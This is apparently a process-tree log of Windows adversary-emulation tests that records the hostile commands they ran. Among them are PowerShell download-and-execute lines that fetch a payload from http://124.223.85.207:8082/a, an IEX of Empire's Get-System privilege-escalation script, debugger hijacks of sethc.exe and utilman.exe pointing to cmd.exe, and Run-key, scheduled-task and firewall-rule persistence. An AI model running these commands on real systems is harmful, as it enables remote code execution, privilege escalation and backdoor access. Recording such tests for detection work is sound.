+GameBar.exe (PID 6512): ""C:\Program Files\WindowsApps\Microsoft.XboxGamingOverlay_5.721.12013.0_x64__8wekyb3d8bbwe\GameBar.exe" -ServerName:App.AppXbdkk0yrkwpcgeaem8zk81k8py1eaahny.mca" PackageFullName="Microsoft.XboxGamingOverlay_5.721.12013.0_x64__8wekyb3d8bbwe" ApplicationID="App"
+      connected to → 40.74.108.123:443
+      connected to → 13.107.5.91:443
+      connected to → 117.18.237.29:80
+GameBarFTServer.exe (PID 18392): ""C:\Program Files\WindowsApps\Microsoft.XboxGamingOverlay_5.721.12013.0_x64__8wekyb3d8bbwe\GameBarFTServer.exe" -Embedding" PackageFullName="Microsoft.XboxGamingOverlay_5.721.12013.0_x64__8wekyb3d8bbwe" ApplicationID="App"
+svchost.exe (PID 8452): "C:\WINDOWS\system32\svchost.exe -k BcastDVRUserService -s BcastDVRUserService"
+RuntimeBroker.exe (PID 18676): "C:\Windows\System32\RuntimeBroker.exe -Embedding" PackageFullName="Microsoft.XboxGamingOverlay_5.721.12013.0_x64__8wekyb3d8bbwe" ApplicationID="runtimebroker07f4358a809ac99a64a67c1"
+svchost.exe (PID 14780): "C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s XblAuthManager"
+backgroundTaskHost.exe (PID 16412): ""C:\WINDOWS\system32\BackgroundTaskHost.exe" -ServerName:BackgroundTaskHost.WebAccountProvider" PackageFullName="Microsoft.XboxIdentityProvider_12.85.31001.0_x64__8wekyb3d8bbwe" ApplicationID="Microsoft.XboxIdentityProvider"
+BackgroundTransferHost.exe (PID 6664): ""BackgroundTransferHost.exe" -ServerName:BackgroundTransferHost.1" PackageFullName="Microsoft.XboxGamingOverlay_5.721.12013.0_x64__8wekyb3d8bbwe" ApplicationID="App"
+      connected to → 23.78.216.11:443
+      connected to → 117.18.237.29:80
+sc.exe (PID 4744): "C:\WINDOWS\system32\sc.exe start wuauserv"  [x3]
+svchost.exe (PID 11548): "C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s wlidsvc"  [x17]
+svchost.exe (PID 9376): "C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s gpsvc"  [x8]
+backgroundTaskHost.exe (PID 13372): ""C:\WINDOWS\system32\backgroundTaskHost.exe" -ServerName:ShellFeedsUI.AppXnj65k2d1a1rnztt2t2nng5ctmk3e76pn.mca" PackageFullName="Microsoft.Windows.Search_1.14.3.19041_neutral_neutral_cw5n1h2txyewy" ApplicationID="ShellFeedsUI"  [x8]
+      connected to → 202.89.233.96:443
+      connected to → 221.194.154.216:443
+      connected to → 204.79.197.203:443
+LocationNotificationWindows.exe (PID 4964): "C:\WINDOWS\System32\LocationNotificationWindows.exe"  [x8]
+MicrosoftEdgeUpdate.exe (PID 2524): ""C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /ua /installsource scheduler"  [x8]
+dllhost.exe (PID 3068): "C:\WINDOWS\system32\DllHost.exe /Processid:{7966B4D8-4FDC-4126-A10B-39A3209AD251}"
+LogonUI.exe (PID 7568): ""LogonUI.exe" /flags:0x0 /state0:0xa0fb1055 /state1:0x41c64e6d"
+svchost.exe (PID 14004): "C:\WINDOWS\System32\svchost.exe -k netsvcs -p -s BITS"  [x6]
+powershell.exe (PID 7148): "powershell.exe -ExecutionPolicy Bypass -C .\47�Զ������ʼ�B.ps1"
+      wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_1u2xzrek.ogg.ps1
+  └─ csc.exe (PID 14448): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\4iwlyhn4\4iwlyhn4.cmdline""
+        wrote → C:\Users\Administrator\AppData\Local\Temp\4iwlyhn4\4iwlyhn4.dll
+    └─ cvtres.exe (PID 6480): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RES34B4.tmp" "c:\Users\Administrator\AppData\Local\Temp\4iwlyhn4\CSCE10EFB0F87374A028BB2C41E7AC324B0.TMP""
+GoogleUpdate.exe (PID 16600): ""C:\Program Files (x86)\Google\Update\GoogleUpdate.exe" /svc"  [x2]
+      connected to → 120.253.255.162:443
+      connected to → 120.253.253.226:443
+powershell.exe (PID 12940): "powershell.exe -ExecutionPolicy Bypass -C "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"""  [x5]
+      wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_xbawa0xe.cb2.ps1
+      wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_tx5komm2.qrf.ps1
+      wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_dip5zgqy.ere.ps1
+      wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_dw3ilvea.wnp.ps1
+      wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_mefohxt5.amq.ps1
+  └─ csc.exe (PID 4388): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\yajshw1q\yajshw1q.cmdline""
+        wrote → C:\Users\Administrator\AppData\Local\Temp\yajshw1q\yajshw1q.dll
+    └─ cvtres.exe (PID 14764): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RES9DFD.tmp" "c:\Users\Administrator\AppData\Local\Temp\yajshw1q\CSCC27C022EA157424789D83980FB41D195.TMP""
+  └─ powershell.exe (PID 13124): ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe" -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))""  [x5]
+        wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_uttj5ob4.qgk.ps1
+        connected to → 124.223.85.207:8082
+        connected to → 124.223.85.207:8084
+        wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_ahqkiquo.hnx.ps1
+        wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_wqyhhpdp.cd5.ps1
+        wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_j5rttxkk.xxq.ps1
+        wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_0f3bdq2r.cxe.ps1
+  └─ csc.exe (PID 18564): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\pzcm3d5p\pzcm3d5p.cmdline""
+        wrote → C:\Users\Administrator\AppData\Local\Temp\pzcm3d5p\pzcm3d5p.dll
+    └─ cvtres.exe (PID 9048): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RES9C38.tmp" "c:\Users\Administrator\AppData\Local\Temp\pzcm3d5p\CSCBBED3B5A8FC14E4C8BCA258D5D91B14E.TMP""
+  └─ csc.exe (PID 11792): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\05gtqq4u\05gtqq4u.cmdline""
+        wrote → C:\Users\Administrator\AppData\Local\Temp\05gtqq4u\05gtqq4u.dll
+    └─ cvtres.exe (PID 15876): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RES6190.tmp" "c:\Users\Administrator\AppData\Local\Temp\05gtqq4u\CSCAC62F36FA19548EEB424A2AD57D9823A.TMP""
+  └─ csc.exe (PID 11132): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\jgxmesmb\jgxmesmb.cmdline""
+        wrote → C:\Users\Administrator\AppData\Local\Temp\jgxmesmb\jgxmesmb.dll
+    └─ cvtres.exe (PID 16212): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RES40DF.tmp" "c:\Users\Administrator\AppData\Local\Temp\jgxmesmb\CSCC1F23095508A48788050B7776D7F8469.TMP""
+  └─ csc.exe (PID 4648): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\paq2rlez\paq2rlez.cmdline""
+        wrote → C:\Users\Administrator\AppData\Local\Temp\paq2rlez\paq2rlez.dll
+    └─ cvtres.exe (PID 972): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RESDF6C.tmp" "c:\Users\Administrator\AppData\Local\Temp\paq2rlez\CSC4570C509201B47F3A215E963584B3840.TMP""
+powershell.exe (PID 8528): "powershell.exe -ExecutionPolicy Bypass -C " Start-Process .\T1059.003_script.bat""
+      wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_etziywi5.3r0.ps1
+  └─ csc.exe (PID 3912): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\fhwdixby\fhwdixby.cmdline""
+        wrote → C:\Users\Administrator\AppData\Local\Temp\fhwdixby\fhwdixby.dll
+    └─ cvtres.exe (PID 12652): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RESC646.tmp" "c:\Users\Administrator\AppData\Local\Temp\fhwdixby\CSC6CAA6AA7A0DE43F3812D4EDDDF7BD98.TMP""
+  └─ cmd.exe (PID 3464): "C:\WINDOWS\system32\cmd.exe /c ""C:\Users\Administrator\Desktop\shell\T1059.003_script.bat" ""
+cmd.exe (PID 9424): "cmd.exe /C "cscript.exe  /e:VBScript.Encode T1059.007.vbs""  [x2]
+  └─ cscript.exe (PID 12740): "cscript.exe   /e:VBScript.Encode T1059.007.vbs"  [x2]
+wsqmcons.exe (PID 6320): "C:\WINDOWS\System32\wsqmcons.exe"
+cmd.exe (PID 18364): "cmd.exe /C "schtasks /create /tn test /tr c:\test\1053.005.bat /sc onlogon""  [x11]
+  └─ schtasks.exe (PID 16580): "schtasks  /create /tn test /tr c:\test\1053.005.bat /sc onlogon"  [x11]
+cmd.exe (PID 13416): "cmd.exe /C "schtasks /delete /tn test /f""  [x11]
+  └─ schtasks.exe (PID 10480): "schtasks  /delete /tn test /f"  [x11]
+cmd.exe (PID 15784): "cmd.exe /C "netsh advfirewall firewall add rule name=\"test\" dir=in protocol=tcp action=allow localport=80""  [x4]
+  └─ netsh.exe (PID 4816): "netsh  advfirewall firewall add rule name=\"test\" dir=in protocol=tcp action=allow localport=80"  [x4]
+cmd.exe (PID 13288): "cmd.exe /C "wmic computersystem get domain""  [x4]
+  └─ WMIC.exe (PID 5792): "wmic  computersystem get domain"  [x4]
+cmd.exe (PID 7476): "cmd.exe /C "reg add \"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\" /v test /t REG_SZ /d \"C:\windows\system32\calc.exe\" /f""
+  └─ reg.exe (PID 8744): "reg  add \"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\" /v test /t REG_SZ /d \"C:\windows\system32\calc.exe\" /f"
+powershell.exe (PID 15668): "powershell.exe -ExecutionPolicy Bypass -C "Invoke-AtomicTest T1134.001 -TestNumbers 1""  [x12]
+      wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_m2z44eio.psf.ps1
+      wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_ts01ezkk.2kw.ps1
+      wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_offcn2hf.ma5.ps1
+      wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_bya3yemq.11l.ps1
+      wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_5yks51e3.w5p.ps1
+      wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_m3vqga0i.ja0.ps1
+      wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_0x5gzw3n.ih2.ps1
+      wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_0d04khe3.ztj.ps1
+      wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_net13rcu.3r1.ps1
+      wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_v4axpmn4.t1n.ps1
+      wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_xhctm3gu.xmq.ps1
+      wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_kdjqrtql.khg.ps1
+  └─ csc.exe (PID 12024): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\rj51a2aa\rj51a2aa.cmdline""
+        wrote → C:\Users\Administrator\AppData\Local\Temp\rj51a2aa\rj51a2aa.dll
+    └─ cvtres.exe (PID 4188): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RESA568.tmp" "c:\Users\Administrator\AppData\Local\Temp\rj51a2aa\CSC69987A1E891048F297459D71D0A9C759.TMP""
+  └─ HOSTNAME.EXE (PID 8904): ""C:\WINDOWS\system32\HOSTNAME.EXE""  [x32]
+  └─ whoami.exe (PID 12300): ""C:\WINDOWS\system32\whoami.exe""  [x32]
+  └─ powershell.exe (PID 6640): ""powershell.exe" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique NamedPipe -Verbose}"  [x2]
+        wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_lu4fk0i0.zuh.ps1
+        connected to → 185.199.109.133:443
+        wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_aygqssxa.qvg.ps1
+    └─ csc.exe (PID 19024): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\lbfowsgp\lbfowsgp.cmdline""
+          wrote → C:\Users\Administrator\AppData\Local\Temp\lbfowsgp\lbfowsgp.dll
+      └─ cvtres.exe (PID 15252): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RESA911.tmp" "c:\Users\Administrator\AppData\Local\Temp\lbfowsgp\CSC5C7822791F754E7486A439DAA52914D.TMP""
+    └─ csc.exe (PID 11736): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\oztnp4xi\oztnp4xi.cmdline""
+          wrote → C:\Users\Administrator\AppData\Local\Temp\oztnp4xi\oztnp4xi.dll
+      └─ cvtres.exe (PID 14368): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RESF9F0.tmp" "c:\Users\Administrator\AppData\Local\Temp\oztnp4xi\CSC2E1569416EFF4A7B814A818C1E193C.TMP""
+  └─ csc.exe (PID 10116): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\b1oyrudp\b1oyrudp.cmdline""
+        wrote → C:\Users\Administrator\AppData\Local\Temp\b1oyrudp\b1oyrudp.dll
+    └─ cvtres.exe (PID 17480): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RESF666.tmp" "c:\Users\Administrator\AppData\Local\Temp\b1oyrudp\CSC66C299FECC14DEFBFB5E77107D6CAE.TMP""
+  └─ csc.exe (PID 10224): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\neo15q2z\neo15q2z.cmdline""
+        wrote → C:\Users\Administrator\AppData\Local\Temp\neo15q2z\neo15q2z.dll
+    └─ cvtres.exe (PID 9632): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RES6053.tmp" "c:\Users\Administrator\AppData\Local\Temp\neo15q2z\CSC970AF964835D4DC9B95E35EEF03CDA0.TMP""
+  └─ cmd.exe (PID 18824): ""cmd.exe" /c "echo [InternetShortcut] > %temp%\T1547.009_modified_shortcut.url & echo URL=C:\windows\system32\calc.exe >> %temp%\T1547.009_modified_shortcut.url & %temp%\T1547.009_modified_shortcut.url""  [x5]
+    └─ calc.exe (PID 14788): ""C:\windows\system32\calc.exe" "  [x5]
+  └─ csc.exe (PID 12572): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\of3whqhl\of3whqhl.cmdline""
+        wrote → C:\Users\Administrator\AppData\Local\Temp\of3whqhl\of3whqhl.dll
+    └─ cvtres.exe (PID 11736): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RES8A9F.tmp" "c:\Users\Administrator\AppData\Local\Temp\of3whqhl\CSCBE2CA9A6E62A42FD9568FA544A49D1.TMP""
+  └─ powershell.exe (PID 16268): ""powershell.exe" & {$input_table = \""osk.exe, sethc.exe, utilman.exe, magnify.exe, narrator.exe, DisplaySwitch.exe, atbroker.exe\"".split(\"",\"") $Name = \""Debugger\"" $Value = \""C:\windows\system32\cmd.exe\"" Foreach ($item in $input_table){ $item = $item.trim() $registryPath = \""HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$item\"" IF(!(Test-Path $registryPath)) { New-Item -Path $registryPath -Force New-ItemProperty -Path $registryPath -Name $name -V"
+        wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_55uevqrj.ucx.ps1
+    └─ csc.exe (PID 7136): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\lxqjtr1p\lxqjtr1p.cmdline""
+          wrote → C:\Users\Administrator\AppData\Local\Temp\lxqjtr1p\lxqjtr1p.dll
+      └─ cvtres.exe (PID 10380): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RESA55B.tmp" "c:\Users\Administrator\AppData\Local\Temp\lxqjtr1p\CSC7810F3B0B444F58AC12B2F8CC91C840.TMP""
+  └─ csc.exe (PID 7964): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\hcqpd5ph\hcqpd5ph.cmdline""
+        wrote → C:\Users\Administrator\AppData\Local\Temp\hcqpd5ph\hcqpd5ph.dll
+    └─ cvtres.exe (PID 14340): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RES391A.tmp" "c:\Users\Administrator\AppData\Local\Temp\hcqpd5ph\CSCBD9B6B44B63345B098664CE41569BF1E.TMP""
+  └─ csc.exe (PID 9320): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\0ed1msgb\0ed1msgb.cmdline""
+        wrote → C:\Users\Administrator\AppData\Local\Temp\0ed1msgb\0ed1msgb.dll
+    └─ cvtres.exe (PID 10476): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RES66C1.tmp" "c:\Users\Administrator\AppData\Local\Temp\0ed1msgb\CSC2FE2F08D5DEA40AD9DDF7B743967484C.TMP""
+  └─ powershell.exe (PID 4716): ""powershell.exe" & {$input_table = \""osk.exe, sethc.exe, utilman.exe, magnify.exe, narrator.exe, DisplaySwitch.exe, atbroker.exe\"".split(\"",\"")$Name = \""Debugger\""$Value = \""C:\windows\system32\cmd.exe\""Foreach ($item in $input_table){$item = $item.trim()$registryPath = \""HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$item\""IF(!(Test-Path $registryPath)){New-Item -Path $registryPath -Force New-ItemProperty -Path $registryPath -Name $name -V"  [x4]
+        wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_uaqwphfr.pun.ps1
+        wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_xzaitabg.hj3.ps1
+        wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_rljajv5z.t3k.ps1
+        wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_fhtly5ym.aun.ps1
+    └─ csc.exe (PID 11272): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\3qy3xyqm\3qy3xyqm.cmdline""
+          wrote → C:\Users\Administrator\AppData\Local\Temp\3qy3xyqm\3qy3xyqm.dll
+      └─ cvtres.exe (PID 19204): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RES78A3.tmp" "c:\Users\Administrator\AppData\Local\Temp\3qy3xyqm\CSCE01EDCCE63C4A1CAFC676B5E218D2F8.TMP""
+    └─ csc.exe (PID 9072): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\xhipv0cx\xhipv0cx.cmdline""
+          wrote → C:\Users\Administrator\AppData\Local\Temp\xhipv0cx\xhipv0cx.dll
+      └─ cvtres.exe (PID 10528): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RES734F.tmp" "c:\Users\Administrator\AppData\Local\Temp\xhipv0cx\CSCE149E55386264C0693C5789495A3A12.TMP""
+    └─ csc.exe (PID 16936): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\czr0lgve\czr0lgve.cmdline""
+          wrote → C:\Users\Administrator\AppData\Local\Temp\czr0lgve\czr0lgve.dll
+      └─ cvtres.exe (PID 3376): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RES1FAD.tmp" "c:\Users\Administrator\AppData\Local\Temp\czr0lgve\CSC508F2C22EBC14DE882323565771685D8.TMP""
+    └─ csc.exe (PID 1488): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\xlrokjdc\xlrokjdc.cmdline""
+          wrote → C:\Users\Administrator\AppData\Local\Temp\xlrokjdc\xlrokjdc.dll
+      └─ cvtres.exe (PID 19200): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RES2BBE.tmp" "c:\Users\Administrator\AppData\Local\Temp\xlrokjdc\CSCDF59FDB04F754851A9BF202219E0C3D9.TMP""
+  └─ csc.exe (PID 3436): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\ovghyo4e\ovghyo4e.cmdline""
+        wrote → C:\Users\Administrator\AppData\Local\Temp\ovghyo4e\ovghyo4e.dll
+    └─ cvtres.exe (PID 11628): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RES477C.tmp" "c:\Users\Administrator\AppData\Local\Temp\ovghyo4e\CSCC1CFECA9EB64460EA64D92233E6D4168.TMP""
+  └─ csc.exe (PID 12924): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\tdglppip\tdglppip.cmdline""
+        wrote → C:\Users\Administrator\AppData\Local\Temp\tdglppip\tdglppip.dll
+    └─ cvtres.exe (PID 18744): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RES6F77.tmp" "c:\Users\Administrator\AppData\Local\Temp\tdglppip\CSCB513DBE513BB46DCB740B3264D224EC8.TMP""
+  └─ csc.exe (PID 17288): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\lx5ue4v1\lx5ue4v1.cmdline""
+        wrote → C:\Users\Administrator\AppData\Local\Temp\lx5ue4v1\lx5ue4v1.dll
+    └─ cvtres.exe (PID 17172): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RESDC2C.tmp" "c:\Users\Administrator\AppData\Local\Temp\lx5ue4v1\CSC8B09A95225D94535B9C5C893B1DAFB.TMP""
+  └─ csc.exe (PID 16644): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\vskgdgm4\vskgdgm4.cmdline""
+        wrote → C:\Users\Administrator\AppData\Local\Temp\vskgdgm4\vskgdgm4.dll
+    └─ cvtres.exe (PID 14600): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RES4C2.tmp" "c:\Users\Administrator\AppData\Local\Temp\vskgdgm4\CSC8EB7F7C4BA24743BE74BC6E21AC32E0.TMP""
+  └─ csc.exe (PID 11436): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\g3bale4j\g3bale4j.cmdline""
+        wrote → C:\Users\Administrator\AppData\Local\Temp\g3bale4j\g3bale4j.dll
+    └─ cvtres.exe (PID 11764): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RESFFAD.tmp" "c:\Users\Administrator\AppData\Local\Temp\g3bale4j\CSC57000EDD1974A96B93F707BF610C019.TMP""
+  └─ csc.exe (PID 6240): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\usi4csb4\usi4csb4.cmdline""
+        wrote → C:\Users\Administrator\AppData\Local\Temp\usi4csb4\usi4csb4.dll
+    └─ cvtres.exe (PID 13936): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RES27C6.tmp" "c:\Users\Administrator\AppData\Local\Temp\usi4csb4\CSCE9850FA4B9EC4F6E8D7DF46F6F5D6C20.TMP""
+cmd.exe (PID 17264): "C:\WINDOWS\system32\cmd.exe /C start C:\WINDOWS\system32\cmd.exe /C "timeout /t 3 >nul&&echo TestSVC > \\.\pipe\TestSVC""  [x2]
+  └─ cmd.exe (PID 15084): "C:\WINDOWS\system32\cmd.exe  /C "timeout /t 3 >nul&&echo TestSVC > \\.\pipe\TestSVC""  [x2]
+    └─ timeout.exe (PID 4020): "timeout  /t 3 "  [x4]
+cmd.exe (PID 11628): "cmd.exe /C "del /f HookSSLX64.dll""  [x3]
+cmd.exe (PID 3716): "cmd.exe /C spolsv.exe"  [x6]
+  └─ spolsv.exe (PID 17812): "spolsv.exe"  [x6]
